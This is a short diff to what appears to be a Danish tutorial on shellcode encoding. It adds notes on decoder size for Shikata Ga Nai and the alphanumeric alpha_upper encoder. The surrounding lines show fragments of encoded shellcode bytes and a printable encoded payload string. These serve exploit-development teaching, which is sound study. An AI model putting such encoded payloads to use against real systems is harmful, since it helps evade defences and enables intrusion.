@@ -166,6 +166,8 @@ buf += "\xd0\x5d\xb9\x6e\x72\xb1\x11\x40\xf1\xa5\x42\xfc\x9c"
 buf += "\x5b\x14\xe3\x6f\x6d\x4c\xef\xd7\xf4\x5c\x6f"
 ------------------------------------------------
 
+Det er lidt forskelligt hvor meget Shikata Ga Nai decoderen fylder, men omkring 25-30 bytes. Hver byte i den oprindelige shellcode tilføjer én enkodet byte.
+
 Udfordringer - Printable
 ------------------------
 [source,bash]
@@ -190,3 +192,5 @@ x86/alpha_upper chosen with final size 185
 Payload size: 185 bytes
 PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJISZKOSZDGK9ZEQK1N3ZBF1HPFLMPL6DM0RJS4E08MMPMUIP3Q1J45ZMMYKCCZC3V9PICZGOV88MMPRUL8BJE8SXFO6O6OBSE8FOU2RIBNLIJCP1IY2J4KPXJ9XMK0AA
 ------------------------------------------------
+
+Decoderen fylder 61 bytes, og hver byte i den oprindelige shellcode fylder to bytes enkodet.
